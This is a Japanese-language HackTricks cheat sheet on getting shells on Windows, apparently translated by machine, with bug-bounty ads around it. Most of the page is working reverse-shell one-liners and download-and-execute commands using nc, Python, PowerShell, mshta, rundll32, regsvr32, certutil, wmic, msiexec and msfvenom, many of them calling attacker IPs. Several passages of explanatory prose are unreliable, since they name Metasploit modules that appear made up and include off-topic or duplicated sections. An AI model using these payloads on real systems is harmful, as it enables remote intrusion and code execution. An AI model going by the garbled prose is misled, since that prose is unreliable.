# シェル - Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後に開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)してハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## Lolbas

ページ[lolbas-project.github.io](https://lolbas-project.github.io/)は、Linuxの[https://gtfobins.github.io/](https://gtfobins.github.io/)のようなWindows向けです。\
明らかに、**WindowsにはSUIDファイルやsudo特権はありません**が、いくつかの**バイナリ**がどのように（悪用されて）任意のコードを実行するかを知るのは役に立ちます。

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**sbd**は、ポータブルで強力な暗号化を提供するために設計されたNetcatのクローンです。Unix系のオペレーティングシステムとMicrosoft Win32で動作します。sbdには、AES-CBC-128 + HMAC-SHA1暗号化（Christophe Devineによる）、プログラムの実行（-eオプション）、ソースポートの選択、遅延を伴う連続再接続など、他の便利な機能があります。sbdはTCP/IP通信のみをサポートしています。sbd.exe（Kali Linuxディストリビューションの一部：/usr/share/windows-resources/sbd/sbd.exe）は、Netcatの代替としてWindowsボックスにアップロードすることができます。

## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
Perlは、多くのハッキングシナリオで使用される強力なスクリプト言語です。Perlスクリプトは、Windowsシステムでのペネトレーションテストや情報収集に役立ちます。

### Windowsシェルの作成
Windowsシェルを作成するために、Perlスクリプトを使用することができます。以下のスクリプトは、Windowsシステムでのシェルの作成方法を示しています。

```perl
use Win32::Console;
use Win32::API;

my $console = Win32::Console->new();
my $kernel32 = Win32::API->new('kernel32', 'SetConsoleTitle', ['P'], 'I');
my $user32 = Win32::API->new('user32', 'ShowWindow', ['N', 'N'], 'I');

$kernel32->Call('My Shell');
$user32->Call(0, 0);

while (1) {
    $console->Write("My Shell> ");
    my $cmd = <STDIN>;
    chomp $cmd;
    last if $cmd eq 'exit';
    system($cmd);
}

$user32->Call(1, 0);
```

このスクリプトは、Win32::ConsoleとWin32::APIモジュールを使用しています。スクリプトを実行すると、Windowsシェルが作成され、コマンドを入力することができます。`exit`と入力すると、シェルが終了します。

このPerlスクリプトを使用することで、Windowsシステムでのペネトレーションテストや情報収集に役立つシェルを作成することができます。
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## ルビー

Rubyは、オブジェクト指向のスクリプト言語であり、多くのプラットフォームで動作します。Rubyは、シンプルで読みやすい構文を持ち、柔軟性と拡張性に優れています。Rubyは、Webアプリケーションの開発や自動化スクリプトの作成に広く使用されています。

### Rubyのシェル

Rubyのシェルは、Rubyスクリプトを実行するための環境です。Rubyのシェルを使用すると、コマンドラインからRubyスクリプトを実行し、結果を表示することができます。

以下は、Rubyのシェルの使用例です。

```ruby
puts "Hello, World!"
```

上記のコードは、"Hello, World!"というメッセージを表示するシンプルなRubyスクリプトです。このスクリプトをRubyのシェルで実行すると、メッセージが表示されます。

### Rubyのシェルの利点

Rubyのシェルを使用すると、以下のような利点があります。

- シンプルな構文：Rubyのシェルは、シンプルで読みやすい構文を持っています。これにより、初心者でも簡単にRubyスクリプトを作成できます。
- 柔軟性と拡張性：Rubyのシェルは、柔軟性と拡張性に優れています。これにより、さまざまな用途に応じたスクリプトを作成することができます。
- プラットフォームのサポート：Rubyのシェルは、多くのプラットフォームで動作します。これにより、さまざまな環境でRubyスクリプトを実行することができます。

Rubyのシェルは、Rubyスクリプトの実行や開発に便利なツールです。Rubyのシェルを使用して、効率的にプログラミング作業を行いましょう。
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Luaは、軽量で高速なスクリプト言語であり、組み込みシステムやゲーム開発などのさまざまな用途に使用されています。Luaは、シンプルな構文と強力な拡張性を備えており、C言語との統合も容易です。Luaスクリプトは、Windowsシェル上で実行することもできます。

### Luaスクリプトの実行

WindowsシェルでLuaスクリプトを実行するには、次の手順を実行します。

1. Luaの実行可能ファイル（`lua.exe`）をダウンロードしてインストールします。
2. コマンドプロンプトを開き、Luaスクリプトが保存されているディレクトリに移動します。
3. 次のコマンドを入力して、Luaスクリプトを実行します。

```shell
lua script.lua
```

ここで、`script.lua`は実行したいLuaスクリプトのファイル名です。

### Luaスクリプトのデバッグ

Luaスクリプトのデバッグには、デバッガツールを使用することができます。デバッガツールを使用すると、スクリプトの実行中に変数の値を確認したり、ステップ実行したりすることができます。

一般的なLuaデバッガツールには、[ZeroBrane Studio](https://studio.zerobrane.com/)や[Decoda](http://unknownworlds.com/decoda/)などがあります。これらのツールを使用すると、より効率的にLuaスクリプトをデバッグできます。

Luaスクリプトのデバッグには、以下の手順を実行します。

1. デバッガツールをダウンロードしてインストールします。
2. デバッガツールを起動し、Luaスクリプトを開きます。
3. 必要な設定（ブレークポイントなど）を行います。
4. スクリプトを実行し、デバッガツールのインターフェースを使用してデバッグを行います。

Luaスクリプトのデバッグには、デバッガツールのドキュメントやチュートリアルを参照することをおすすめします。
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

攻撃者（Kali）
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
被害者
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershellは、Windowsシステムで使用される強力なスクリプト言語およびコマンドラインシェルです。Powershellは、Windowsの管理タスクを自動化し、システムの設定や構成を効率的に行うために使用されます。

Powershellは、.NETフレームワークをベースにしており、Windowsの機能やAPIにアクセスするための豊富なコマンドレットを提供しています。これにより、システムの情報の取得や変更、ファイルの操作、ネットワークの管理など、さまざまなタスクを実行することができます。

Powershellは、コマンドラインインターフェース（CLI）として使用することも、スクリプトとして実行することもできます。スクリプトを作成することで、複数のコマンドや操作をまとめて実行することができます。

Powershellは、システム管理者やセキュリティエンジニアにとって非常に便利なツールです。Powershellを使用することで、システムの監視、脆弱性のスキャン、ログの分析など、さまざまなセキュリティ関連のタスクを効率的に実行することができます。

Powershellは、Windowsシステムでのハッキングやペネトレーションテストにおいても重要な役割を果たします。ハッカーは、Powershellを使用して、システムに侵入したり、機密情報を抽出したりすることができます。そのため、システム管理者やセキュリティエンジニアは、Powershellのセキュリティに対する理解と対策を強化する必要があります。

Powershellは、Windowsシステムでのハッキングにおいて非常に強力なツールですが、正当な目的で使用されることもあります。システム管理者やセキュリティエンジニアは、Powershellの機能と使用方法を理解し、適切に活用することが重要です。
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
ネットワーク呼び出しを実行するプロセス: **powershell.exe**\
ディスク上に書き込まれたペイロード: **NO** (_少なくとも私が procmon を使用して見つけることはありませんでした！_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
ネットワーク呼び出しを実行するプロセス：**svchost.exe**\
ディスク上に書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

**ワンライナー：**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. HTAs are standalone applications that can be executed directly from the Windows shell without the need for a web browser.

### Usage

To execute a command using Mshta, you can use the following syntax:

```
mshta.exe javascript:command;
```

For example, to display a message box with the text "Hello, World!", you can use the following command:

```
mshta.exe javascript:alert('Hello, World!');
```

### Advantages

Mshta can be useful in scenarios where you want to execute arbitrary commands on a target system without relying on traditional command-line utilities. Since HTAs are executed by the HTML Application Host, they have the ability to interact with the Windows shell and perform various actions.

### Limitations

It's important to note that Mshta may be detected by antivirus software due to its ability to execute arbitrary commands. Additionally, the use of Mshta may require administrative privileges on the target system.

### Detection

To detect the use of Mshta, you can monitor for the execution of the `mshta.exe` process or look for suspicious command-line arguments that include `javascript:`.

### Mitigation

To mitigate the risk of Mshta being used for malicious purposes, it is recommended to restrict the execution of `mshta.exe` through application whitelisting or by using security solutions that can detect and block its usage.

For more information on different Powershell Shells, refer to the [Powershell Shells](../shells/powershell.md) section at the end of this document.
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
ネットワーク呼び出しを実行するプロセス: **mshta.exe**\
ディスク上に書き込まれたペイロード: **IEローカルキャッシュ**
```bash
mshta http://webserver/payload.hta
```
ネットワーク呼び出しを実行するプロセス: **mshta.exe**\
ディスク上に書き込まれたペイロード: **IEローカルキャッシュ**
```bash
mshta \\webdavserver\folder\payload.hta
```
ネットワークコールを実行するプロセス：**svchost.exe**\
ディスク上に書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

#### **hta-pshリバースシェルの例（htaを使用してPSバックドアをダウンロードして実行する）**
```markup
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Koadicゾンビを非常に簡単にダウンロードして実行することができます。ステージャーhtaを使用した例**

#### htaの例
```markup
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

The `mshta - sct` technique is a method used to execute malicious scripts on a Windows system. It leverages the `mshta.exe` utility, which is a legitimate Windows component used to execute HTML applications (.hta files). By combining `mshta.exe` with a scriptlet file (.sct), an attacker can bypass security measures and run arbitrary code.

To use this technique, the attacker first creates a scriptlet file containing the malicious code. This file is then hosted on a web server or delivered to the target system through other means. The attacker then uses the `mshta.exe` utility to execute the scriptlet file, which in turn executes the malicious code.

The `mshta - sct` technique is effective because it allows the attacker to bypass security measures that may be in place to block the execution of certain file types, such as .exe or .bat files. By using a combination of `mshta.exe` and a scriptlet file, the attacker can execute arbitrary code without triggering these security measures.

It is important for system administrators and security professionals to be aware of this technique and implement appropriate security measures to detect and prevent its use. This may include monitoring for suspicious `mshta.exe` activity, blocking access to known malicious scriptlet files, and keeping systems up to date with the latest security patches.
```markup
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a Microsoft HTML Application Host that allows you to execute HTML applications (.hta files) on Windows systems. It is a legitimate Windows component that can be abused by attackers to execute malicious code.

Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that exploits the Mshta vulnerability. This module generates a malicious .hta file and delivers it to the target system. When the .hta file is executed, it runs the specified payload, giving the attacker remote access to the target machine.

To use the `exploit/windows/browser/mshta` module in Metasploit, follow these steps:

1. Set the `RHOST` option to the IP address of the target system.
2. Set the `PAYLOAD` option to the desired payload.
3. Set the `LHOST` option to the IP address of the attacking machine.
4. Run the exploit.

Once the exploit is successful, the attacker will have a Meterpreter session, which provides a powerful interface to interact with the compromised system.

It is important to note that using Metasploit for unauthorized access to systems is illegal and unethical. This information is provided for educational purposes only.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Defenderによって検出されました**

## **Rundll32**

[**Dllハローワールドの例**](https://github.com/carterjones/hello-world-dll)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**
```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
ネットワーク呼び出しを実行するプロセス：**rundll32.exe**\
ディスク上に書き込まれたペイロード：**IEローカルキャッシュ**

**Defenderによって検出されました**

**Rundll32 - sct**
```bash
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL (Dynamic Link Library) functions. Metasploit, a popular penetration testing framework, provides a module called `windows/local/execute` that leverages the Rundll32 utility to execute malicious DLLs.

To use this module, you need to provide the path to the malicious DLL file using the `DLL` option. Additionally, you can specify the function name to be executed using the `FUNCTION` option. If no function name is provided, the module will execute the `DllMain` function by default.

Here is an example of how to use the `windows/local/execute` module in Metasploit:

```
use windows/local/execute
set DLL /path/to/malicious.dll
set FUNCTION FunctionName
run
```

Once executed, the module will load the specified DLL and execute the specified function. This technique can be useful for bypassing security measures and executing arbitrary code on a target system.

It is important to note that the Rundll32 utility is commonly used by legitimate Windows processes, so its usage may not raise suspicion. However, it is crucial to ensure that the DLL being executed is malicious and not a legitimate system file.

#### **Rundll32 - Metasploit**

Rundll32は、DLL（Dynamic Link Library）関数の実行を可能にするWindowsユーティリティです。人気のあるペネトレーションテストフレームワークであるMetasploitは、`windows/local/execute`というモジュールを提供しており、Rundll32ユーティリティを利用して悪意のあるDLLを実行することができます。

このモジュールを使用するには、`DLL`オプションを使用して悪意のあるDLLファイルのパスを指定する必要があります。さらに、`FUNCTION`オプションを使用して実行する関数名を指定することもできます。関数名が指定されていない場合、モジュールはデフォルトで`DllMain`関数を実行します。

以下は、Metasploitで`windows/local/execute`モジュールを使用する例です。

```
use windows/local/execute
set DLL /path/to/malicious.dll
set FUNCTION 関数名
run
```

実行すると、モジュールは指定されたDLLをロードし、指定された関数を実行します。この技術は、セキュリティ対策を回避し、ターゲットシステムで任意のコードを実行するために役立ちます。

Rundll32ユーティリティは、合法的なWindowsプロセスによって一般的に使用されるため、使用しても疑いをかけられない場合があります。ただし、実行されるDLLが悪意のあるものであり、合法的なシステムファイルではないことを確認することが重要です。
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files. Koadic is a post-exploitation tool that uses the Rundll32 utility to load a malicious DLL file and execute commands on a compromised system.

To use Koadic, first, you need to generate a malicious DLL file using the Koadic framework. This DLL file contains the payload that will be executed on the target system. Once the DLL file is generated, it can be loaded using the Rundll32 utility.

To load the DLL file, open a command prompt and run the following command:

```
rundll32.exe <path_to_malicious_dll>,<entry_point>
```

Replace `<path_to_malicious_dll>` with the path to the generated DLL file and `<entry_point>` with the entry point function name defined in the DLL file.

Once the DLL file is loaded, Koadic establishes a communication channel with the compromised system, allowing the attacker to execute various commands and perform post-exploitation activities.

It is important to note that the Rundll32-Koadic technique is just one of many methods used in post-exploitation scenarios. It is crucial to understand the risks and legal implications associated with using such techniques before attempting them.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

Regsvr32は、Windowsシステムで使用されるコマンドラインツールです。主に、DLL（ダイナミックリンクライブラリ）ファイルを登録および解除するために使用されます。このツールは、WindowsのレジストリにDLLファイルのエントリを追加または削除することにより、プログラムの機能を拡張または制限することができます。

Regsvr32コマンドは、次のようなシナリオで使用されます。

- DLLファイルの登録: `regsvr32 filename.dll`コマンドを使用して、DLLファイルをWindowsのレジストリに登録します。これにより、プログラムがDLLファイルの機能を利用できるようになります。

- DLLファイルの解除: `regsvr32 /u filename.dll`コマンドを使用して、既に登録されているDLLファイルをWindowsのレジストリから解除します。これにより、プログラムがDLLファイルの機能を利用できなくなります。

Regsvr32コマンドは、悪意のあるユーザーによって悪用される可能性があるため、注意が必要です。悪意のあるDLLファイルを登録することにより、システムに深刻なセキュリティリスクが発生する可能性があります。したがって、信頼できるソースからのみDLLファイルを登録することが重要です。

また、Regsvr32コマンドは、システムの一部の機能を制限するためにも使用されます。これにより、特定のプログラムや機能を無効化することができます。ただし、これは正当な目的でのみ使用するべきであり、悪意のある目的で使用することは違法です。

Regsvr32コマンドは、Windowsシステムで一般的に使用されるツールの1つです。正当な目的で使用する場合は、注意して使用する必要があります。
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
ネットワーク呼び出しを実行するプロセス: **regsvr32.exe**\
ディスク上に書き込まれたペイロード: **IEのローカルキャッシュ**
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
ネットワーク呼び出しを実行するプロセス：**svchost.exe**\
ディスク上に書き込まれたペイロード：**WebDAVクライアントのローカルキャッシュ**

**Defenderによって検出されました**

#### Regsvr32 -sct
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used to execute arbitrary code. Metasploit provides a module called `regsvr32_command_delivery` that leverages this utility to execute malicious code on a target system.

To use this module, follow these steps:

1. Start Metasploit by running `msfconsole` in your terminal.
2. Search for the `regsvr32_command_delivery` module by typing `search regsvr32_command_delivery`.
3. Load the module by typing `use exploit/windows/local/regsvr32_command_delivery`.
4. Set the required options, such as `SESSION` and `CMD`.
5. Run the exploit by typing `exploit`.

This technique can be useful during a penetration test to gain remote access to a Windows system. However, it is important to note that using this technique without proper authorization is illegal and unethical. Always ensure you have the necessary permissions before attempting any penetration testing activities.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Koadicゾンビを非常に簡単にダウンロードして実行することができます。ステージャーregsvrを使用します**

## Certutil

B64dllをダウンロードし、デコードして実行します。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
B64exeをダウンロードし、デコードして実行します。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Defenderによって検出されました**



<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグ報奨金の場所です。**

**遅延なしで報酬を受け取る**\
HackenProofの報奨金は、顧客が報奨金予算を入金した後にのみ開始されます。バグが検証された後に報奨金を受け取ることができます。

**Web3ペントestingの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！その成長期において、Web3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register) ハッキングから収益を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used for running VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload delivery method. By creating a malicious script using VBScript or JScript and then executing it with Cscript, an attacker can deliver a payload to a target system. This payload can be a backdoor, a keylogger, or any other type of malicious software.

To use Cscript with Metasploit, you can create a script that includes the desired payload and then use the `exploit/windows/local/cscript` module to execute it on the target system. This module allows you to specify the path to the script and the arguments to be passed to Cscript.

Here is an example of how to use Cscript with Metasploit:

```
use exploit/windows/local/cscript
set PAYLOAD windows/meterpreter/reverse_tcp
set SCRIPT /path/to/malicious_script.vbs
set ARGS arg1 arg2 arg3
exploit
```

In this example, the `PAYLOAD` option specifies the type of payload to use (in this case, a reverse TCP meterpreter payload), the `SCRIPT` option specifies the path to the malicious script, and the `ARGS` option specifies any arguments to be passed to Cscript.

Once the exploit is executed, Metasploit will use Cscript to run the malicious script on the target system, delivering the payload and establishing a connection back to the attacker's machine.

It is important to note that using Cscript as a payload delivery method may trigger antivirus or other security software on the target system. To increase the chances of success, it is recommended to use evasion techniques or modify the payload to bypass detection.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Defenderによって検出されました**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれたペイロード: **WebDAVクライアントのローカルキャッシュ**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**防御者によって検出されました**

## **MSIExec**

攻撃者
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
被害者：
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**検出されました**

## **Wmic**
```
wmic os get /format:"https://webserver/payload.xsl"
```
ネットワーク呼び出しを実行するプロセス：**wmic.exe**\
ディスク上に書き込まれたペイロード：**IEローカルキャッシュ**

例：xslファイル：
```
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
抽出元は[こちら](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

**検出されない**

**stager wmicを使用して、非常に簡単にKoadicゾンビをダウンロードして実行できます**

## Msbuild
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
ネットワーク呼び出しを実行するプロセス: **svchost.exe**\
ディスク上に書き込まれるペイロード: **WebDAVクライアントのローカルキャッシュ**

